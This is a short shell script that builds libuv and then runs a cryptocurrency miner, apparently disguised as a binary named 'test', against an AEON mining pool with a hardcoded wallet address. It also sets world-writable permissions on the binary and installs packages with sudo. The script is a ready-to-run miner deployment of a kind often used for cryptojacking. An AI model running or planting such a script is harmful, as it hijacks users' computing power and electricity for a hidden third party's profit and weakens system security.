#!/bin/sh
wget https://dist.libuv.org/dist/v1.8.0/libuv-v1.8.0.tar.gz
tar -zxvf libuv-v1.8.0.tar.gz
cd libuv-v1.8.0
sudo apt-get -y install automake libtool autoconf make libmicrohttpd-dev
./autogen.sh
./configure --prefix=/usr
make
make install
cd ..
chmod 0777 test
read -p "input your computer name: " name
./test -a cryptonight-lite -o aeon.minexmr.cn:3333 -u Wmt8AHPGjtt167AZJR9GdjHaSB3Rn2szvSpSkT5dgRV15Z55ew9yiwo4NWQWfGhbkpFNbsdKjddz6ijXRyrCaA3D1rRnT4cZH+3000 -p $name:possible@2cy.link -k -v 2